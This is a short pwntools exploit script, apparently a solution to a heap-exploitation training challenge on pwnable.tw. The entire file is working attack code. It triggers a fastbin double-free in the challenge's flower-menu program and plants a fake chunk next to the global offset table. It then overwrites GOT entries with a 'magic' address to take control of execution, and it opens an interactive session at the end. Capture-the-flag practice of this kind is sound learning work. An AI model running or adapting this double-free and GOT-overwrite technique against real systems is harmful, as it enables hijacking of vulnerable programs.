#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "training.pwnable.tw"
port = 11012

r = remote(host,port)

def raiseflower(length,name,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil(":")
    r.sendline("2")

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil(":")
    r.sendline("4")

magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")
remove(0)
remove(1)
remove(0)
raiseflower(0x50,p64(fake_chunk),"blue")
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")
raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")

r.interactive()
